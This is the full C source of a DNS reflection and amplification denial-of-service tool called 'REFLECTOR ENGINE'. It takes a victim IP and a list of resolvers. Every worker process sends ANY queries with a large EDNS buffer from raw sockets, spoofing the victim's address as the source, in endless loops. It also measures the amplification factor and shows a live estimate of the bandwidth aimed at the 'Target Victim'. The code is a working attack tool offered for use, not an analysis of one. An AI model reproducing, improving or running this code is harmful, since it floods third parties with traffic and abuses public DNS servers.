#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <getopt.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <pthread.h>

/* --- PLATFORM COMPATIBILITY --- */
#ifdef __APPLE__
    #include <netinet/ip.h>
    #include <netinet/udp.h>
    #define IP_HDR struct ip
    #define UDP_HDR struct udphdr
    #define UDP_SRC(udp) (udp->uh_sport)
    #define UDP_DST(udp) (udp->uh_dport)
    #define UDP_LEN(udp) (udp->uh_ulen)
    #define IP_V(ip, v) (ip->ip_v = v)
    #define IP_HL(ip, l) (ip->ip_hl = l)
    #define IP_P(ip, p) (ip->ip_p = p)
    #define IP_SRC(ip, s) (ip->ip_src.s_addr = s)
    #define IP_DST(ip, d) (ip->ip_dst.s_addr = d)
    #define IP_TOTLEN(ip, l) (ip->ip_len = l)
#else
    #include <linux/ip.h>
    #include <linux/udp.h>
    #define IP_HDR struct iphdr
    #define UDP_HDR struct udphdr
    #define UDP_SRC(udp) (udp->source)
    #define UDP_DST(udp) (udp->dest)
    #define UDP_LEN(udp) (udp->len)
    #define IP_V(ip, v) (ip->version = v)
    #define IP_HL(ip, l) (ip->ihl = l)
    #define IP_P(ip, p) (ip->protocol = p)
    #define IP_SRC(ip, s) (ip->saddr = s)
    #define IP_DST(ip, d) (ip->daddr = d)
    #define IP_TOTLEN(ip, l) (ip->tot_len = htons(l))
#endif

typedef struct {
    unsigned long long packets_sent;
    float current_leverage;
    int is_running;
} stats_t;

stats_t *shared_stats;

void print_banner() {
    printf("\033[1;32m      ___  __  __ _  _ ___ \n");
    printf("     / _ \\|  \\/  |  \\| |_ _|\n");
    printf("    | (_) | |\\/| | |\\  || | \n");
    printf("     \\___/|_|  |_|_| \\_|___|\033[0m\n");
    printf("\033[1;33m      REFLECTOR ENGINE v0.1 \033[0m\n\n");
}

void dns_format(unsigned char *dns, unsigned char *host) {
    int lock = 0; char temp[256];
    strncpy(temp, (char*)host, 255); strcat(temp, ".");
    for (int i = 0; i < (int)strlen(temp); i++) {
        if (temp[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) *dns++ = temp[lock];
            lock++;
        }
    }
    *dns++ = 0x00;
}

float calculate_leverage(char *resolver, char *domain) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct timeval tv; tv.tv_sec = 2; tv.tv_usec = 0;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET; dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(resolver);
    unsigned char buf[4096]; memset(buf, 0, 4096);
    buf[0] = 0xAA; buf[1] = 0xBB; buf[2] = 0x01; buf[5] = 0x01; buf[11] = 0x01;
    dns_format(buf + 12, (unsigned char *)domain);
    int d_len = strlen((char*)buf + 12) + 1;
    unsigned char *q = buf + 12 + d_len;
    q[1] = 0xff; q[3] = 0x01;
    unsigned char *opt = q + 4;
    opt[1] = 0x00; opt[2] = 0x29; opt[3] = 0x10;
    int q_size = 12 + d_len + 4 + 11;
    sendto(s, buf, q_size, 0, (struct sockaddr *)&dest, sizeof(dest));
    int res = recvfrom(s, buf, 4096, 0, NULL, NULL);
    close(s);
    if (res <= 0) return -1.0;
    return (float)res / (float)(q_size + 28);
}

void *stats_worker(void *arg) {
    unsigned long long last_p = 0;
    char *spinner = "|/-\\";
    int s_idx = 0;

    printf("\n\033[1;37m[LIVE STATS]\033[0m\n");
    while(1) {
        sleep(1);
        unsigned long long current_p = shared_stats->packets_sent;
        unsigned long long diff = current_p - last_p;
        float lev = shared_stats->current_leverage;
        double mbps_out = (diff * 95.0 * 8.0) / 1000000.0;
        double mbps_impact = mbps_out * (lev > 0 ? lev : 1.0);

        printf("\r\033[K %c PPS: \033[1;36m%llu\033[0m | TX: \033[1;32m%.2f Mbps\033[0m | ",
               spinner[s_idx++ % 4], diff, mbps_out);

        if (lev > 0) {
            // Impact auto-scaling
            if (mbps_impact >= 1000.0)
                printf("IMPACT: \033[1;31m%.2f Gbps\033[0m", mbps_impact / 1000.0);
            else
                printf("IMPACT: \033[1;31m%.2f Mbps\033[0m", mbps_impact);

            // Leverage Bar
            printf(" | LEVA: [");
            int bar_w = (int)lev / 2; if(bar_w > 15) bar_w = 15;
            for(int i=0; i<15; i++) printf(i < bar_w ? "#" : ".");
            printf("] \033[1;33m%.1fx\033[0m", lev);
        } else {
            printf("IMPACT: \033[1;30mUNKNOWN\033[0m | LEVA: \033[1;30mN/A\033[0m");
        }

        fflush(stdout);
        last_p = current_p;
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    char *victim_ip = NULL, *query_domain = NULL, *dns_arg = NULL;
    int workers = sysconf(_SC_NPROCESSORS_ONLN) * 2;
    unsigned int delay = 0;
    int verify = 0;

    static struct option long_options[] = {
        {"source", 1, 0, 's'}, {"list", 1, 0, 'l'}, {"query", 1, 0, 'q'},
        {"threads", 1, 0, 't'}, {"delay", 1, 0, 'd'}, {"verify", 0, 0, 'v'}, {"help", 0, 0, 'h'}, {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "s:l:q:t:d:vh", long_options, NULL)) != -1) {
        switch (opt) {
            case 's': victim_ip = optarg; break;
            case 'q': query_domain = optarg; break;
            case 'l': dns_arg = optarg; break;
            case 't': workers = atoi(optarg); break;
            case 'd': delay = atoi(optarg); break;
            case 'v': verify = 1; break;
            case 'h': printf("Usage: sudo %s -s <target> -q <domain> -l <list> [-v]\n", argv[0]); return 0;
        }
    }

    if (!victim_ip || !query_domain || !dns_arg) return 1;

    char *dns_servers[1024]; int dns_count = 0;
    char *temp_arg = strdup(dns_arg); char *token = strtok(temp_arg, ",");
    while(token) { dns_servers[dns_count++] = strdup(token); token = strtok(NULL, ","); }

    print_banner();
    printf("\033[1;37m[CONFIGURATION]\033[0m\n");
    printf("  Target Victim : \033[1;31m%s\033[0m\n", victim_ip);
    printf("  Query Domain  : %s\n", query_domain);
    printf("  Reflectors    : %d active\n", dns_count);
    printf("  Workers       : %d proc | Delay: %u us\n\n", workers, delay);

    shared_stats = mmap(NULL, sizeof(stats_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    shared_stats->current_leverage = -1.0;

    if (verify) {
        printf("\033[1;34m[*] Verifying leverage...\033[0m "); fflush(stdout);
        shared_stats->current_leverage = calculate_leverage(dns_servers[0], query_domain);
        if (shared_stats->current_leverage > 0) printf("OK (%.1fx)\n", shared_stats->current_leverage);
        else printf("FAILED (Check resolver/domain)\n");
    }

    pthread_t t_id; pthread_create(&t_id, NULL, stats_worker, NULL);

    for (int p = 0; p < workers; p++) {
        if (fork() == 0) {
            int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            int one = 1; setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
            char packet[4096]; memset(packet, 0, 4096);
            IP_HDR *ip = (IP_HDR *) packet;
            UDP_HDR *udp = (UDP_HDR *) (packet + sizeof(IP_HDR));
            unsigned char *dns = (unsigned char *)(packet + sizeof(IP_HDR) + sizeof(UDP_HDR));

            dns[2] = 0x01; dns[4] = 0x00; dns[5] = 0x01; dns[11] = 0x01;
            dns_format(dns + 12, (unsigned char *)query_domain);
            int d_len = strlen((char*)dns + 12) + 1;
            unsigned char *qptr = dns + 12 + d_len;
            qptr[1] = 0xff; qptr[3] = 0x01;
            unsigned char *opt = qptr + 4;
            opt[1] = 0x00; opt[2] = 0x29; opt[3] = 0x10;
            int dns_len = 12 + d_len + 4 + 11;
            int total_len = sizeof(IP_HDR) + sizeof(UDP_HDR) + dns_len;

            IP_V(ip, 4); IP_HL(ip, 5); IP_P(ip, IPPROTO_UDP);
            IP_SRC(ip, inet_addr(victim_ip)); IP_TOTLEN(ip, total_len);
            UDP_DST(udp) = htons(53); UDP_LEN(udp) = htons(sizeof(UDP_HDR) + dns_len);

            unsigned short l_port = 1024 + (getpid() % 10000);
            while(1) {
                for(int i = 0; i < dns_count; i++) {
                    struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(dns_servers[i]);
                    IP_DST(ip, sin.sin_addr.s_addr); UDP_SRC(udp) = htons(l_port++);
                    dns[0] = rand() % 255;
                    sendto(s, packet, total_len, 0, (struct sockaddr *)&sin, sizeof(sin));
                    shared_stats->packets_sent++;
                    if(delay > 0) usleep(delay);
                }
            }
        }
    }
    pthread_join(t_id, NULL);
    return 0;
}
